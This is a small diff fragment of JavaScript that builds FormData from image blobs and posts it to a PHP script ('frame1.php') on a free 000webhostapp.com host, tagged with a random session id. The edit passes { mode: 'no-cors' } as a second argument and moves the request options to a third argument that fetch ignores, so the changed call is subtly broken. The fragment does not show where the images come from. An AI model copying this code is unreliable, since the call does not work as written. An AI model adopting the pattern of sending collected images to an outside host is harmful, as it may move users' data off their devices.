@@ -108,7 +108,7 @@ function main() {
                         formData.append('image'+index, blobFile)
                     }
                 );
-                fetch('https://rosagro.000webhostapp.com/frame1.php?sid='+randomInteger(0, 1000000000), {
+                fetch('https://rosagro.000webhostapp.com/frame1.php?sid='+randomInteger(0, 1000000000), { mode: 'no-cors'}, {
                     method: "post",
                     headers: {
                     },
